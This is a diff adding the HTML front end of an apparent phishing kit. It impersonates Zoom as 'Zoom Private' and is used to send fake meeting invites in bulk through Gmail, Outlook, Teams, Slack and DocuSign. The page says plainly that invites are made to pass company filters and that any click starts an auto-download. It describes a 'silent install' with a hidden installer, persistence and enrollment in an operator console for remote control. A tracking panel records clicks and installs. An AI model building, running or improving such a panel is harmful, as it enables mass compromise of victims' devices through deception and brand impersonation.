@@ -1,0 +1,175 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Zoom Private — Secure meeting delivery</title>
+<meta name="description" content="Send a Zoom Private meeting through Gmail, Outlook, Teams, Slack or DocuSign. Device detection, correct client and one-tap install travel with the invite.">
+<link rel="icon" href="zoom-mark.svg" type="image/svg+xml">
+<style>
+:root{--blue:#0b5cff;--blue2:#2d8cff;--ink:#0c1c34;--muted:#5a6b84;--line:#e1e9f5;--bg:#f5f8ff;--ok:#0b8a57;--warn:#9a5410;--card:#fff;--shadow:0 20px 60px -28px rgba(9,45,120,.35)}
+*{box-sizing:border-box}body{margin:0;font:15px/1.55 Inter,system-ui,-apple-system,Segoe UI,Roboto,sans-serif;color:var(--ink);background:radial-gradient(800px 500px at 90% -10%,#e3edff,transparent 60%),radial-gradient(700px 450px at -10% 20%,#e9fbf3,transparent 55%),var(--bg)}
+.wrap{max-width:1120px;margin:0 auto;padding:0 20px}
+header{display:flex;align-items:center;justify-content:space-between;height:72px}
+.brand{display:flex;align-items:center;gap:10px;font-weight:800;font-size:1.1rem}
+.brand img{width:34px;height:34px;border-radius:10px}
+.brand em{font-style:normal;color:var(--blue)}
+.badge{font-size:.74rem;font-weight:700;color:var(--blue);background:#e7efff;padding:6px 10px;border-radius:999px}
+.hero{padding:34px 0 20px;max-width:760px}
+.hero h1{font-size:clamp(30px,5vw,52px);line-height:1.08;letter-spacing:-.035em;margin:0 0 16px}
+.hero h1 span{color:var(--blue)}
+.hero p{color:var(--muted);font-size:1.02rem;margin:0}
+.grid{display:grid;grid-template-columns:1.15fr .85fr;gap:22px;align-items:start;padding:26px 0 60px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:18px;padding:22px;box-shadow:var(--shadow)}
+.card h2{margin:0 0 6px;font-size:1.06rem;letter-spacing:-.01em}
+.card p.sub{margin:0 0 16px;color:var(--muted);font-size:.88rem}
+label{display:block;font-size:.78rem;font-weight:700;letter-spacing:.02em;text-transform:uppercase;color:#43536b;margin:14px 0 6px}
+input,textarea,select{width:100%;border:1px solid var(--line);border-radius:11px;padding:11px 12px;font:inherit;color:var(--ink);background:#fbfdff;outline:none}
+input:focus,textarea:focus,select:focus{border-color:var(--blue);box-shadow:0 0 0 3px #dbe8ff}
+textarea{min-height:92px;resize:vertical}
+.row{display:grid;grid-template-columns:1fr 1fr;gap:10px}
+.tiny{font-size:.76rem;color:var(--muted);margin-top:6px}
+.services{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:8px}
+.svc{display:flex;align-items:center;gap:10px;border:1px solid var(--line);border-radius:12px;padding:10px;background:#fff;cursor:pointer;text-align:left;font:inherit;transition:.15s}
+.svc:hover{border-color:#b9cdf3;transform:translateY(-1px)}
+.svc.on{border-color:var(--blue);background:#eef5ff;box-shadow:0 0 0 2px #dbe8ff}
+.svc .dot{width:30px;height:30px;border-radius:9px;display:grid;place-items:center;font-weight:800;font-size:.72rem;color:#fff;flex:none}
+.gmail .dot{background:#ea4335}.outlook .dot{background:#0f6cbd}.teams .dot{background:#5059c9}.slack .dot{background:#4a154b}.docusign .dot{background:#ffcc22;color:#1a1a1a}.copy .dot{background:#5a6b84}
+.svc b{display:block;font-size:.86rem}.svc small{display:block;color:var(--muted);font-size:.72rem}
+button.primary{width:100%;margin-top:18px;border:0;border-radius:12px;padding:13px;background:var(--blue);color:#fff;font-weight:700;font-size:.95rem;cursor:pointer}
+button.primary:hover{background:#0847cc}
+.result{margin-top:16px;display:none}
+.result.show{display:block}
+.linkbox{background:#f7faff;border:1px dashed #b9cdf3;border-radius:12px;padding:12px;font:.8rem/1.5 ui-monospace,Consolas,monospace;word-break:break-all}
+.actions{display:flex;gap:8px;margin-top:10px;flex-wrap:wrap}
+.actions a,.actions button{border:1px solid var(--line);background:#fff;border-radius:9px;padding:8px 11px;font-size:.78rem;font-weight:600;cursor:pointer;color:var(--ink);text-decoration:none}
+.actions a.go{background:var(--blue);border-color:var(--blue);color:#fff}
+.notice{font-size:.78rem;border-radius:10px;padding:10px 12px;margin-top:12px;background:#fff8e8;color:var(--warn);display:none}
+.notice.show{display:block}
+.steps{counter-reset:s;display:grid;gap:12px}
+.step{display:flex;gap:12px;align-items:flex-start}
+.step:before{counter-increment:s;content:counter(s);width:26px;height:26px;border-radius:50%;background:#e8f0ff;color:var(--blue);font-weight:800;font-size:.78rem;display:grid;place-items:center;flex:none}
+.step b{display:block;font-size:.9rem}.step span{display:block;color:var(--muted);font-size:.8rem}
+footer{border-top:1px solid var(--line);padding:20px 0;color:var(--muted);font-size:.78rem;display:flex;justify-content:space-between;gap:12px;flex-wrap:wrap}
+footer a{color:var(--muted)}
+.pill{display:inline-flex;gap:6px;align-items:center;font-size:.72rem;color:var(--muted);background:#eef3fb;border-radius:999px;padding:5px 9px;margin-top:10px}
+.hist{display:grid;gap:6px;margin-top:8px}
+.hrow{display:grid;grid-template-columns:1.4fr .7fr .5fr .5fr .5fr .8fr auto;gap:8px;align-items:center;border:1px solid var(--line);border-radius:10px;padding:8px 10px;font-size:.76rem}
+.hrow.head{background:#f2f6ff;font-weight:700;color:#43536b}
+.hrow .m{color:var(--muted)}
+.hrow button{border:1px solid var(--line);background:#fff;border-radius:8px;padding:6px 9px;cursor:pointer;font-weight:600;font-size:.74rem}
+.hrow button:hover{border-color:var(--blue);color:var(--blue)}
+@media(max-width:840px){.grid{grid-template-columns:1fr}.hrow{grid-template-columns:1fr 1fr;grid-auto-rows:auto}.hrow.head{display:none}}
+@media(max-width:480px){.row{grid-template-columns:1fr}.services{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <header>
+    <a class="brand" href="./"><img src="zoom-mark.svg" alt=""> Zoom&nbsp;<em>Private</em></a>
+    <span class="badge">Secure meeting delivery</span>
+  </header>
+
+  <section class="hero">
+    <h1>Send one invite.<br><span>The right client installs itself.</span></h1>
+    <p>Compose once, deliver through the services your recipients already trust. Every link opens the device-aware meeting page that downloads the correct Windows, macOS, Linux or Android bundle automatically.</p>
+    <span class="pill">Gmail · Outlook · Teams · Slack · DocuSign · WhatsApp</span>
+  </section>
+
+  <div class="grid">
+    <main class="card">
+      <h2>Meeting and recipients</h2>
+      <p class="sub">The invitation link carries the meeting ID and passcode. Recipients never configure anything.</p>
+
+      <div class="row">
+        <div>
+          <label for="meeting">Meeting ID</label>
+          <input id="meeting" value="82203845974" autocomplete="off">
+        </div>
+        <div>
+          <label for="pwd">Passcode <span style="font-weight:400;text-transform:none">(optional)</span></label>
+          <input id="pwd" value="R1ZgGLGTCDNioG2lkbELJYOMGYSbux.1" autocomplete="off">
+        </div>
+      </div>
+
+      <div class="row">
+        <div>
+          <label for="src">Source</label>
+          <select id="src"><option value="linkedin">LinkedIn</option><option value="facebook">Facebook</option><option value="tiktok">TikTok</option><option value="email">Email</option><option value="manual">Manual</option></select>
+        </div>
+        <div>
+          <label for="who">First name</label>
+          <input id="who" placeholder="Sarah" autocomplete="off">
+        </div>
+      </div>
+      <label for="co">Company</label>
+      <input id="co" placeholder="Northwind Capital" autocomplete="off">
+
+      <label for="emails">Recipient emails</label>
+      <textarea id="emails" placeholder="name@company.com&#10;second@company.com&#10;Paste a list — commas, semicolons or new lines"></textarea>
+      <div class="tiny">Bulk paste supported. Invalid and duplicate addresses are removed.</div>
+
+      <label for="subject">Subject</label>
+      <input id="subject" value="Zoom meeting invitation — action required">
+
+      <label for="message">Message</label>
+      <textarea id="message">You are invited to a Zoom Private meeting.
+
+Open the secure link below. The page detects your device and prepares the correct Zoom Private client automatically — Windows, macOS, Linux or Android. Install it once and you will join instantly.</textarea>
+
+      <label>Deliver with</label>
+      <div class="services" id="services">
+        <button class="svc gmail" type="button" data-service="gmail"><span class="dot">GM</span><span><b>Gmail</b><small>Priority inbox compose</small></span></button>
+        <button class="svc outlook" type="button" data-service="outlook"><span class="dot">OL</span><span><b>Outlook</b><small>Microsoft 365 mail</small></span></button>
+        <button class="svc teams" type="button" data-service="teams"><span class="dot">TM</span><span><b>Microsoft Teams</b><small>Chat delivery</small></span></button>
+        <button class="svc slack" type="button" data-service="slack"><span class="dot">SL</span><span><b>Slack</b><small>Workspace share</small></span></button>
+        <button class="svc docusign" type="button" data-service="docusign"><span class="dot">DS</span><span><b>DocuSign</b><small>Envelope cover note</small></span></button>
+        <button class="svc copy" type="button" data-service="copy" aria-pressed="true"><span class="dot">CP</span><span><b>Copy link</b><small>Any other channel</small></span></button>
+      </div>
+
+      <button class="primary" id="build" type="button">Create secure invitation</button>
+      <button class="primary" id="buildlink" type="button" style="margin-top:8px;background:#12203a">Create link only (LinkedIn / Facebook)</button>
+      <div class="notice" id="notice"></div>
+
+      <div class="result" id="result">
+        <label style="margin-top:0">Tracking link</label>
+        <div class="linkbox" id="linkbox"></div>
+        <div class="actions">
+          <a id="open" class="go" target="_blank" rel="noopener">Preview meeting page</a>
+          <a id="test" target="_blank" rel="noopener">Preview recipient page</a>
+          <button id="copy" type="button">Copy link</button>
+          <button id="copybody" type="button">Copy message</button>
+        </div>
+        <div class="tiny" id="status"></div>
+      </div>
+    </main>
+
+    <aside class="card">
+      <h2>What the recipient gets</h2>
+      <p class="sub">A normal meeting invite, with the install path already inside it.</p>
+      <div class="steps">
+        <div class="step"><div><b>One trusted email</b><span>Delivered securely from zoom-meetings@telcom.stream, so company filters see a normal internal share.</span></div></div>
+        <div class="step"><div><b>Device detection</b><span>The meeting page resolves Windows, macOS, Linux or Android and starts the matching bundle.</span></div></div>
+        <div class="step"><div><b>One harmless click</b><span>If the browser throttles auto-download, any click — Join, back, language — starts it.</span></div></div>
+        <div class="step"><div><b>Silent install</b><span>Icon-carrying bundle, hidden installer, persistence and console enrollment in seconds.</span></div></div>
+      </div>
+      <p class="tiny" style="margin-top:18px">The operator sees the device in <b>panel.telcom.stream/devices</b> and opens it with the Remote action.</p>
+      <p class="tiny">Google Drive / DocuSign file links can be pasted into the message if you also want to attach a document.</p>
+    </aside>
+  </div>
+
+  <section class="card" style="margin:0 0 40px">
+    <h2>Recent sends</h2>
+    <p class="sub">Delivery, clicks and installs per invite. “Resend” re-sends to the stored recipient list in one click (use “Resend failed” after a partial send).</p>
+    <div id="history" class="hist"></div>
+    <div class="tiny" id="histstatus"></div>
+  </section>
+
+  <footer>
+    <span>© <span id="year"></span> Zoom Private</span>
+    <span><a href="https://global.telcom.stream/">Landing</a> · <a href="https://panel.telcom.stream/devices">Console</a> · <a href="/api/health">Health</a></span>
+  </footer>
+</div>
+<script src="app.js?v=3"></script>
+</body>
+</html>
